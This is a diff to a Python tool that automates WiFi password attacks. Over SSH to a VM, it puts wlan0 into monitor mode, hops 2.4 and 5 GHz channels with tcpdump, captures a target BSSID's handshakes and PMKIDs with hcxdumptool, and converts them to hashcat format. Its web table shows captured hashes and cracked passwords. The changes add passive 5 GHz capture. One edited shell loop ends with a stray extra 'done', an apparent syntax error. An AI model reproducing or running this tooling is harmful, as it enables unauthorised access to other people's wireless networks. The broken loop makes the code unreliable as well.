@@ -714,13 +714,13 @@ class App:
                   CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
                   CH + 'ifconfig wlan0 up 2>/dev/null\n' +
                   CH + 'iw reg set TW 2>/dev/null\nsleep 1\n' +
-                  'for ch in 1 2 3 4 5 6 7 8 9 10 11 12 13 14; do\n' +
+                  'for ch in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 '
+                  '36 40 44 48 149 153 157 161; do\n' +
                   CH + '  /usr/sbin/iw dev wlan0 set channel $ch 2>/dev/null\n' +
-                  CH + '  rm -f /tmp/bc_$ch.pcap\n' +
-                  CH + '  timeout 2.5 /usr/bin/tcpdump -i wlan0 -s 160 -w /tmp/bc_$ch.pcap 2>/dev/null\n' +
                   '  echo "MARK:$ch"\n' +
-                  CH + '  /usr/bin/tcpdump -r /tmp/bc_$ch.pcap -e -n 2>/dev/null\n' +
-                  'done\n')
+                  CH + '  timeout 2.5 /usr/bin/tcpdump -i wlan0 -e -n '
+                  '2>/dev/null\n' +
+                  'done\ndone\n')
         try:
             with self._cap_lock:
                 r = subprocess.run(VM_SSH.split() + ['sh', '-s'], input=script.encode(),
@@ -1054,6 +1054,8 @@ class App:
                 c = int(v[1])
             except (TypeError, ValueError):
                 continue
+            if c > 14:
+                continue
             g = v[2] if v[2] is not None else -95
             chans[c] = chans.get(c, 0) + 1 + max(0, g + 90) // 20
         if not chans:
@@ -1106,6 +1108,8 @@ class App:
             try:
                 c = int(v[1])
             except (TypeError, ValueError):
+                continue
+            if c > 14:
                 continue
             g = v[2] if v[2] is not None else -95
             e = chans.setdefault(c, [0, -100])
@@ -1198,6 +1202,18 @@ class App:
         self.hash_pool.clear()
         self.set_phase('cap', '第 %d 輪抓包 (%ds)' % (rnd, dur),
                        'hcxdumptool %s ch%s' % (bssid, ch))
+        try:
+            chi = int(ch)
+        except (TypeError, ValueError):
+            chi = 1
+        if chi > 14:
+            capcmd = ('timeout %d ' % dur + CH +
+                      'tcpdump -i wlan0 -s 0 -w /tmp/scan_%d '
+                      '2>/dev/null\n' % rnd)
+        else:
+            capcmd = ('timeout %d ' % dur + CH + 'hcxdumptool -i wlan0 -c ' +
+                      str(ch) + 'a -w /tmp/scan_%d -t 7 --rds=2 '
+                      '2>&1 | tail -15\n' % rnd)
         script = (BIND +
 CH + 'sh -c "rm -f /tmp/scan_*" 2>/dev/null\n' +
 CH + 'ifconfig wlan0 down 2>/dev/null\n' +
@@ -1205,10 +1221,7 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                   CH + 'ifconfig wlan0 up 2>/dev/null\n' +
                   CH + 'iw reg set TW 2>/dev/null\n' +
                   CH + 'iw dev wlan0 set channel %s 2>/dev/null\nsleep 3\n' % ch +
-                  'timeout %d ' % dur +
-                   CH + 'hcxdumptool -i wlan0 -c ' + str(ch) + 'a '
-                        '-w /tmp/scan_%d -t 7 --rds=2 2>&1 | tail -15\n'
-                        % rnd +
+                  capcmd +
                   'echo "===CONVERT==="\n' +
                   CH + 'hcxpcapngtool --all -o /tmp/scan_%d.22000 /tmp/scan_%d '
                        '2>&1 | tail -4\n' % (rnd, rnd) +
@@ -1865,8 +1878,8 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
               'tb.innerHTML=HDR+s.aps.map(a=>{const m=a.pw?("🔑 "+a.pw):'
               '(a.hash?"✅ hash":"—");'
               'const c=a.pw?"#7ee787":(a.hash?"#e3b341":"#8b949e");'
-              'const d=a.bidir?"✅ 雙向":"⚠️ 單向";'
-              'const dc=a.bidir?"#7ee787":"#f0883e";'
+              'const d=a.ch>14?"👂 5G被動":(a.bidir?"✅ 雙向":"⚠️ 單向");'
+              'const dc=a.ch>14?"#a371f7":(a.bidir?"#7ee787":"#f0883e");'
               'return "<tr><td>"+a.ssid+"</td><td>"+a.bssid+"</td><td>"+'
               'a.ch+"</td><td>"+a.sig+"</td><td style=\\\"color:"+dc+"\\\">"+d+'
               '"</td><td style=\\\"color:"+c+"\\\">"+m+'
